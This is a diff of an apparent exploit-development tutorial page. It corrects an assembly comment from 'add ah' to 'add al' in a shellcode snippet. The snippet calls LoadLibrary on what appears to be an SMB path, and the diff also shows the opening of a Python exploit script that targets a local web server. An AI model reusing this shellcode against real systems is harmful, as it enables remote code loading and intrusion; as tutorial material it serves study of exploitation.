@@ -236,11 +236,11 @@ s<span style="color:#f92672">.</span>close()</code></pre></div>
 
 <p>We create a small asm shellcode:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">load_lib <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
-load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x04\x28</span><span style="color:#e6db74">&#34;</span>                  <span style="color:#75715e"># add ah, 28h</span>
+load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x04\x28</span><span style="color:#e6db74">&#34;</span>                  <span style="color:#75715e"># add al, 28h</span>
 load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                      <span style="color:#75715e"># push eax ; EAX now points to the smb string</span>
 load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xBB\x58\x1B\x50\x62</span><span style="color:#e6db74">&#34;</span>      <span style="color:#75715e"># mov ebx, 62501B58h ; Load EBX with the address of LoadLibrary</span>
 load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xFF\xD3</span><span style="color:#e6db74">&#34;</span>                  <span style="color:#75715e"># call ebx ; Call LoadLibrary()</span></code></pre></div>
-<p>We use <code>add ah, 28h</code> instead of <code>add eax, 28h</code> here to avoid null bytes and shorten the code as much as possible.</p>
+<p>We use <code>add al, 28h</code> instead of <code>add eax, 28h</code> here to avoid null bytes and shorten the code as much as possible.</p>
 
 <p>So the final exploit becomes:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/python</span>
@@ -251,7 +251,7 @@ host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0
 port <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>
 
 load_lib <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
-load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x04\x28</span><span style="color:#e6db74">&#34;</span>                  <span style="color:#75715e"># add ah, 28h</span>
+load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x04\x28</span><span style="color:#e6db74">&#34;</span>                  <span style="color:#75715e"># add al, 28h</span>
 load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                      <span style="color:#75715e"># push eax ; EAX now points to the smb string</span>
 load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xBB\x58\x1B\x50\x62</span><span style="color:#e6db74">&#34;</span>      <span style="color:#75715e"># mov ebx, 62501B58h ; Load EBX with the address of LoadLibrary</span>
 load_lib <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xFF\xD3</span><span style="color:#e6db74">&#34;</span>                  <span style="color:#75715e"># call ebx</span>
